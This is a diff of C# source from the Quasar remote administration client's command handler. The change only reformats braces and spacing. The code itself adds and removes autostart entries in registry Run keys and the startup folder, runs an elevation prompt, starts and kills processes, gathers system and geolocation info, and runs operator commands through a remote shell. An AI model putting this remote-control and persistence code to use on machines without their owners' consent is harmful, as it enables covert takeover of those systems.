@@ -18,40 +18,29 @@ using Quasar.Common.Messages;
 using Models = Quasar.Common.Models;
 using Process = System.Diagnostics.Process;
 
-namespace Quasar.Client.Commands
-{
+namespace Quasar.Client.Commands {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
-    public static partial class CommandHandler
-    {
-        public static void HandleGetDrives(GetDrives command, Networking.Client client)
-        {
+    public static partial class CommandHandler {
+        public static void HandleGetDrives(GetDrives command, Networking.Client client) {
             DriveInfo[] driveInfos;
-            try
-            {
+            try {
                 driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
-            }
-            catch (IOException)
-            {
-                client.Send(new SetStatusFileManager {Message = "GetDrives I/O error", SetLastDirectorySeen = false});
+            } catch (IOException) {
+                client.Send(new SetStatusFileManager { Message = "GetDrives I/O error", SetLastDirectorySeen = false });
                 return;
-            }
-            catch (UnauthorizedAccessException)
-            {
-                client.Send(new SetStatusFileManager {Message = "GetDrives No permission", SetLastDirectorySeen = false});
+            } catch (UnauthorizedAccessException) {
+                client.Send(new SetStatusFileManager { Message = "GetDrives No permission", SetLastDirectorySeen = false });
                 return;
             }
 
-            if (driveInfos.Length == 0)
-            {
-                client.Send(new SetStatusFileManager {Message = "GetDrives No drives", SetLastDirectorySeen = false});
+            if (driveInfos.Length == 0) {
+                client.Send(new SetStatusFileManager { Message = "GetDrives No drives", SetLastDirectorySeen = false });
                 return;
             }
 
             Models.Drive[] drives = new Models.Drive[driveInfos.Length];
-            for (int i = 0; i < drives.Length; i++)
-            {
-                try
-                {
+            for (int i = 0; i < drives.Length; i++) {
+                try {
                     var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
                         ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
                             driveInfos[i].VolumeLabel,
@@ -59,25 +48,19 @@ namespace Quasar.Client.Commands
                         : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
                             driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat);
 
-                    drives[i] = new Models.Drive
-                        { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
-                }
-                catch (Exception)
-                {
-                    
+                    drives[i] = new Models.Drive { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
+                } catch (Exception) {
+
                 }
             }
 
-            client.Send(new GetDrivesResponse {Drives = drives});
+            client.Send(new GetDrivesResponse { Drives = drives });
         }
 
-        public static void HandleDoShutdownAction(DoShutdownAction command, Networking.Client client)
-        {
-            try
-            {
+        public static void HandleDoShutdownAction(DoShutdownAction command, Networking.Client client) {
+            try {
                 ProcessStartInfo startInfo = new ProcessStartInfo();
-                switch (command.Action)
-                {
+                switch (command.Action) {
                     case ShutdownAction.Shutdown:
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.UseShellExecute = true;
@@ -96,137 +79,97 @@ namespace Quasar.Client.Commands
                         Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                         break;
                 }
-            }
-            catch (Exception ex)
-            {
-                client.Send(new SetStatus {Message = $"Action failed: {ex.Message}"});
+            } catch (Exception ex) {
+                client.Send(new SetStatus { Message = $"Action failed: {ex.Message}" });
             }
         }
 
-        public static void HandleGetStartupItems(GetStartupItems command, Networking.Client client)
-        {
-            try
-            {
+        public static void HandleGetStartupItems(GetStartupItems command, Networking.Client client) {
+            try {
                 List<Models.StartupItem> startupItems = new List<Models.StartupItem>();
 
-                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
-                {
-                    if (key != null)
-                    {
-                        foreach (var item in key.GetKeyValues())
-                        {
-                            startupItems.Add(new Models.StartupItem
-                                {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun});
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")) {
+                    if (key != null) {
+                        foreach (var item in key.GetKeyValues()) {
+                            startupItems.Add(new Models.StartupItem { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun });
                         }
                     }
                 }
-                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
-                {
-                    if (key != null)
-                    {
-                        foreach (var item in key.GetKeyValues())
-                        {
-                            startupItems.Add(new Models.StartupItem
-                                {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce});
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce")) {
+                    if (key != null) {
+                        foreach (var item in key.GetKeyValues()) {
+                            startupItems.Add(new Models.StartupItem { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce });
                         }
                     }
                 }
-                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
-                {
-                    if (key != null)
-                    {
-                        foreach (var item in key.GetKeyValues())
-                        {
-                            startupItems.Add(new Models.StartupItem
-                                {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun});
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")) {
+                    if (key != null) {
+                        foreach (var item in key.GetKeyValues()) {
+                            startupItems.Add(new Models.StartupItem { Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun });
                         }
                     }
                 }
-                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
-                {
-                    if (key != null)
-                    {
-                        foreach (var item in key.GetKeyValues())
-                        {
-                            startupItems.Add(new Models.StartupItem
-                                {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce});
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce")) {
+                    if (key != null) {
+                        foreach (var item in key.GetKeyValues()) {
+                            startupItems.Add(new Models.StartupItem { Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce });
                         }
                     }
                 }
-                if (PlatformHelper.Is64Bit)
-                {
-                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
-                    {
-                        if (key != null)
-                        {
-                            foreach (var item in key.GetKeyValues())
-                            {
-                                startupItems.Add(new Models.StartupItem
-                                    {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64Run});
+                if (PlatformHelper.Is64Bit) {
+                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run")) {
+                        if (key != null) {
+                            foreach (var item in key.GetKeyValues()) {
+                                startupItems.Add(new Models.StartupItem { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64Run });
                             }
                         }
                     }
-                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
-                    {
-                        if (key != null)
-                        {
-                            foreach (var item in key.GetKeyValues())
-                            {
-                                startupItems.Add(new Models.StartupItem
-                                {
+                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce")) {
+                        if (key != null) {
+                            foreach (var item in key.GetKeyValues()) {
+                                startupItems.Add(new Models.StartupItem {
                                     Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64RunOnce
                                 });
                             }
                         }
                     }
                 }
-                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
-                {
+                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup))) {
                     var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
 
-                    startupItems.AddRange(files.Where(file => file.Name != "desktop.ini").Select(file => new Models.StartupItem
-                        {Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu}));
+                    startupItems.AddRange(files.Where(file => file.Name != "desktop.ini").Select(file => new Models.StartupItem { Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu }));
                 }
 
-                client.Send(new GetStartupItemsResponse {StartupItems = startupItems});
-            }
-            catch (Exception ex)
-            {
-                client.Send(new SetStatus {Message = $"Getting Autostart Items failed: {ex.Message}"});
+                client.Send(new GetStartupItemsResponse { StartupItems = startupItems });
+            } catch (Exception ex) {
+                client.Send(new SetStatus { Message = $"Getting Autostart Items failed: {ex.Message}" });
             }
         }
 
-        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Networking.Client client)
-        {
-            try
-            {
-                switch (command.StartupItem.Type)
-                {
+        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Networking.Client client) {
+            try {
+                switch (command.StartupItem.Type) {
                     case StartupType.LocalMachineRun:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
-                        {
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true)) {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case StartupType.LocalMachineRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
-                        {
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true)) {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case StartupType.CurrentUserRun:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
-                        {
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true)) {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
-                        {
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true)) {
                             throw new Exception("Could not add value");
                         }
                         break;
@@ -235,8 +178,7 @@ namespace Quasar.Client.Commands
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true))
-                        {
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name, command.StartupItem.Path, true)) {
                             throw new Exception("Could not add value");
                         }
                         break;
@@ -245,22 +187,19 @@ namespace Quasar.Client.Commands
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true))
-                        {
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name, command.StartupItem.Path, true)) {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case StartupType.StartMenu:
-                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
-                        {
+                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup))) {
                             Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                         }
 
                         string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                             command.StartupItem.Name + ".url");
 
-                        using (var writer = new StreamWriter(lnkPath, false))
-                        {
+                        using (var writer = new StreamWriter(lnkPath, false)) {
                             writer.WriteLine("[InternetShortcut]");
                             writer.WriteLine("URL=file:///" + command.StartupItem.Path);
                             writer.WriteLine("IconIndex=0");
@@ -269,44 +208,35 @@ namespace Quasar.Client.Commands
                         }
                         break;
                 }
-            }
-            catch (Exception ex)
-            {
-                client.Send(new SetStatus {Message = $"Adding Autostart Item failed: {ex.Message}"});
+            } catch (Exception ex) {
+                client.Send(new SetStatus { Message = $"Adding Autostart Item failed: {ex.Message}" });
             }
         }
 
-        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Networking.Client client)
-        {
-            try
-            {
-                switch (command.StartupItem.Type)
-                {
+        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Networking.Client client) {
+            try {
+                switch (command.StartupItem.Type) {
                     case StartupType.LocalMachineRun:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
-                        {
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name)) {
                             throw new Exception("Could not remove value");
                         }
                         break;
                     case StartupType.LocalMachineRunOnce:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
-                        {
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name)) {
                             throw new Exception("Could not remove value");
                         }
                         break;
                     case StartupType.CurrentUserRun:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
-                        {
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name)) {
                             throw new Exception("Could not remove value");
                         }
                         break;
                     case StartupType.CurrentUserRunOnce:
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
-                        {
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name)) {
                             throw new Exception("Could not remove value");
                         }
                         break;
@@ -315,8 +245,7 @@ namespace Quasar.Client.Commands
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name))
-                        {
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.StartupItem.Name)) {
                             throw new Exception("Could not remove value");
                         }
                         break;
@@ -325,8 +254,7 @@ namespace Quasar.Client.Commands
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name))
-                        {
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.StartupItem.Name)) {
                             throw new Exception("Could not remove value");
                         }
                         break;
@@ -339,17 +267,13 @@ namespace Quasar.Client.Commands
                         File.Delete(startupItemPath);
                         break;
                 }
-            }
-            catch (Exception ex)
-            {
-                client.Send(new SetStatus {Message = $"Removing Autostart Item failed: {ex.Message}"});
+            } catch (Exception ex) {
+                client.Send(new SetStatus { Message = $"Removing Autostart Item failed: {ex.Message}" });
             }
         }
 
-        public static void HandleGetSystemInfo(GetSystemInfo command, Networking.Client client)
-        {
-            try
-            {
+        public static void HandleGetSystemInfo(GetSystemInfo command, Networking.Client client) {
+            try {
                 IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
 
                 var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
@@ -377,22 +301,17 @@ namespace Quasar.Client.Commands
                     new Tuple<string, string>("ISP", GeoLocationHelper.GeoInfo.Isp)
                 };
 
-                client.Send(new GetSystemInfoResponse {SystemInfos = lstInfos});
-            }
-            catch
-            {
+                client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
+            } catch {
             }
         }
 
-        public static void HandleGetProcesses(GetProcesses command, Networking.Client client)
-        {
+        public static void HandleGetProcesses(GetProcesses command, Networking.Client client) {
             Process[] pList = Process.GetProcesses();
             var processes = new Models.Process[pList.Length];
 
-            for (int i = 0; i < pList.Length; i++)
-            {
-                var process = new Models.Process
-                {
+            for (int i = 0; i < pList.Length; i++) {
+                var process = new Models.Process {
                     Name = pList[i].ProcessName + ".exe",
                     Id = pList[i].Id,
                     MainWindowTitle = pList[i].MainWindowTitle
@@ -400,57 +319,40 @@ namespace Quasar.Client.Commands
                 processes[i] = process;
             }
 
-            client.Send(new GetProcessesResponse {Processes = processes});
+            client.Send(new GetProcessesResponse { Processes = processes });
         }
 
-        public static void HandleDoProcessStart(DoProcessStart command, Networking.Client client)
-        {
-            if (string.IsNullOrEmpty(command.ApplicationName))
-            {
-                client.Send(new SetStatus {Message = "Process could not be started!"});
+        public static void HandleDoProcessStart(DoProcessStart command, Networking.Client client) {
+            if (string.IsNullOrEmpty(command.ApplicationName)) {
+                client.Send(new SetStatus { Message = "Process could not be started!" });
                 return;
             }
 
-            try
-            {
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
+            try {
+                ProcessStartInfo startInfo = new ProcessStartInfo {
                     UseShellExecute = true,
                     FileName = command.ApplicationName
                 };
                 Process.Start(startInfo);
-            }
-            catch
-            {
-                client.Send(new SetStatus {Message = "Process could not be started!"});
-            }
-            finally
-            {
+            } catch {
+                client.Send(new SetStatus { Message = "Process could not be started!" });
+            } finally {
                 HandleGetProcesses(new GetProcesses(), client);
             }
         }
 
-        public static void HandleDoProcessKill(DoProcessKill command, Networking.Client client)
-        {
-            try
-            {
+        public static void HandleDoProcessKill(DoProcessKill command, Networking.Client client) {
+            try {
                 Process.GetProcessById(command.Pid).Kill();
-            }
-            catch
-            {
-            }
-            finally
-            {
+            } catch {
+            } finally {
                 HandleGetProcesses(new GetProcesses(), client);
             }
         }
 
-        public static void HandleDoAskElevate(DoAskElevate command, Networking.Client client)
-        {
-            if (WindowsAccountHelper.GetAccountType() != "Admin")
-            {
-                ProcessStartInfo processStartInfo = new ProcessStartInfo
-                {
+        public static void HandleDoAskElevate(DoAskElevate command, Networking.Client client) {
+            if (WindowsAccountHelper.GetAccountType() != "Admin") {
+                ProcessStartInfo processStartInfo = new ProcessStartInfo {
                     FileName = "cmd",
                     Verb = "runas",
                     Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
@@ -459,26 +361,20 @@ namespace Quasar.Client.Commands
                 };
 
                 MutexHelper.CloseMutex();  // close the mutex so our new process will run
-                try
-                {
+                try {
                     Process.Start(processStartInfo);
-                }
-                catch
-                {
-                    client.Send(new SetStatus {Message = "User refused the elevation request."});
+                } catch {
+                    client.Send(new SetStatus { Message = "User refused the elevation request." });
                     MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                     return;
                 }
                 Program.ConnectClient.Exit();
-            }
-            else
-            {
-                client.Send(new SetStatus {Message = "Process already elevated."});
+            } else {
+                client.Send(new SetStatus { Message = "Process already elevated." });
             }
         }
-        
-        public static void HandleDoShellExecute(DoShellExecute command, Networking.Client client)
-        {
+
+        public static void HandleDoShellExecute(DoShellExecute command, Networking.Client client) {
             string input = command.Command;
 
             if (_shell == null && input == "exit") return;
@@ -490,8 +386,7 @@ namespace Quasar.Client.Commands
                 _shell.ExecuteCommand(input);
         }
 
-        public static void CloseShell()
-        {
+        public static void CloseShell() {
             if (_shell != null)
                 _shell.Dispose();
         }
